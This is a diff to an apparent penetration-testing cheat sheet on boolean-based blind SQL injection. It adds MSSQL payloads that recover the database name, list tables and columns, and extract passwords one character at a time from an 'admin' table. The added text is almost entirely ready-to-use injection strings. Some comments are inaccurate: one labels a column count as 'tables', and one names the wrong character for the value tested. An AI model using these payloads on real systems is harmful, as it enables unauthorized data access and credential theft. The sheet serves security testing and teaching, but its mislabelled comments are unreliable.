@@ -35,7 +35,25 @@ Second, retrieve the database name:
 {% endtab %}
 
 {% tab title="MSSQL" %}
+First, retrieve the database length:
+
 ```sql
+1' AND (SELECT LEN(DB_NAME()))=1--  #False  
+1' AND (SELECT LEN(DB_NAME()))=2--  #False
+1' AND (SELECT LEN(DB_NAME()))=3--  #True -> It means the length of database is 3 characters.
+```
+
+Second, retrieve the database name:
+
+```sql
+--True -> It means the first character is p. Note that ASCII code is in decimal
+1' AND (SELECT ASCII(SUBSTRING(DB_NAME(), 1, 1)))=112-- 
+
+--True -> It means the second character is s.
+1' AND (SELECT ASCII(SUBSTRING(DB_NAME(), 2, 1)))=115--
+
+--True -> It means the third character is s.
+1' AND (SELECT ASCII(SUBSTRING(DB_NAME(), 3, 1)))=115--
 ```
 {% endtab %}
 
@@ -108,7 +126,40 @@ Third, retrieve name of each table
 {% endtab %}
 
 {% tab title="MSSQL" %}
+First, retrieve the number of tables:
+
 ```sql
+1' AND (SELECT count(*) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME())=2--  #True -> 2 tables
+1' AND (SELECT count(*) FROM information_schema.tables)=2-- #Run in actual context/DB
+```
+
+Second, retrieve length of each table
+
+```sql
+-- If True, the first table lenght is 5
+1' AND (SELECT TOP 1 LEN(table_name) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME())=5-- 
+
+-- If True, the second table lenght is 5
+1' AND (SELECT TOP 1 LEN(table_name) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME() AND table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))=5--
+
+-- If True, the third table lenght is 5
+1' AND (SELECT TOP 1 LEN(table_name) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME() AND table_name NOT IN(SELECT TOP 2 table_name FROM information_schema.tables))=5-- 
+```
+
+Third, retrieve name of each table
+
+```sql
+-- If True, the first char of the first table is u
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(table_name, 1, 1)) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME())=117--
+
+-- If True, the second char of the first table is s
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(table_name, 2, 1)) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME())=115--
+
+-- If True, the first char of the second table is p
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(table_name, 1, 1)) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME() AND table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))=112--
+
+-- If True, the first char of the third table is p
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(table_name, 1, 1)) FROM information_schema.tables WHERE TABLE_CATALOG=DB_NAME() AND table_name NOT IN(SELECT TOP 2 table_name FROM information_schema.tables))=112--
 ```
 {% endtab %}
 
@@ -136,16 +187,15 @@ Second, retrieve length of each table
 
 Third, retrieve name of each table
 
-```sql
--- If True, the first char of the first table is u
-1'AND (SELECT ASCII(SUBSTRING(table_name, 1, 1))FROM information_schema.tables WHERE table_schema=current_database() LIMIT 0,1)=117--
-
+<pre class="language-sql"><code class="lang-sql">-- If True, the first char of the first table is u
+<strong>1'AND (SELECT ASCII(SUBSTRING(table_name, 1, 1))FROM information_schema.tables WHERE table_schema=current_database() LIMIT 0,1)=117--
+</strong>
 -- If True, the second char of the first table is s
 1'AND (SELECT ASCII(SUBSTRING(table_name, 2, 1)) FROM information_schema.tables WHERE table_schema=current_database() LIMIT 0,1)=115--
 
 -- If True, the first char of the second table is p
 1'AND (SELECT ASCII(SUBSTRING(table_name, 1, 1)) FROM information_schema.tables WHERE table_schema=current_database() LIMIT 1,1)=112--
-```
+</code></pre>
 {% endtab %}
 
 {% tab title="SQLite" %}
@@ -189,7 +239,39 @@ Third, retrieve name of each column
 {% endtab %}
 
 {% tab title="MSSQL" %}
+First, retrieve the number of columns:
+
 ```sql
+1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE')=2--  #True -> 2 tables
+```
+
+Second, retrieve length of each columns
+
+```sql
+-- If True, the first column lenght is 5
+1' AND (SELECT TOP 1 LEN(column_name) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE')=5-- 
+
+-- If True, the second column lenght is 5
+1' AND (SELECT TOP 1 LEN(column_name) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE' AND column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))=5--
+
+-- If True, the third column lenght is 5
+1' AND (SELECT TOP 1 LEN(column_name) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE' AND column_name NOT IN(SELECT TOP 2 column_name FROM information_schema.columns))=5-- 
+```
+
+Third, retrieve name of each columns
+
+```sql
+-- If True, the first char of the first column is a
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(column_name, 1, 1)) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE')=97--
+
+-- If True, the second char of the first column is b
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(column_name, 2, 1)) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE')=98--
+
+-- If True, the first char of the second column is p
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(column_name, 1, 1)) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE' AND column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))=112--
+
+-- If True, the first char of the third column is p
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(column_name, 1, 1)) FROM information_schema.columns WHERE TABLE_CATALOG=DB_NAME() AND table_name='TABLE_NAME_HERE' AND column_name NOT IN(SELECT TOP 2 column_name FROM information_schema.columns))=112--
 ```
 {% endtab %}
 
@@ -228,6 +310,11 @@ Third, retrieve name of each column
 1'AND (SELECT HEX(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 1,1)=112--
 ```
 {% endtab %}
+
+{% tab title="SQLite" %}
+```sql
+```
+{% endtab %}
 {% endtabs %}
 
 #### Dump values
@@ -252,12 +339,30 @@ Second, retrieve values
 {% endtab %}
 
 {% tab title="MSSQL" %}
-```sql
-```
-{% endtab %}
+First, retrieve the length of the value (we take password column as example):
 
-{% tab title="OracleSQL" %}
 ```sql
+-- True -> 1st password is 9 char
+1' AND (SELECT TOP 1 LEN(password) FROM admin)=9--
+
+-- True -> 2st password is 9 char
+1' AND (SELECT TOP 1 LEN(password) FROM admin WHERE password NOT IN(SELECT TOP 1 password FROM admin))=9--
+```
+
+Second, retrieve values
+
+```sql
+-- If True, the first password's char is p
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 1, 1))FROM admin)=112--
+
+-- If True, the second password's char is a
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 2, 1))FROM admin)=97--
+
+-- If True, the first char of second password is p
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 1, 1))FROM admin WHERE password NOT IN(SELECT TOP 1 password FROM admin))=112--
+
+-- If True, the second char of second password is p
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 2, 1))FROM admin WHERE password NOT IN(SELECT TOP 1 password FROM admin))=97--
 ```
 {% endtab %}
 
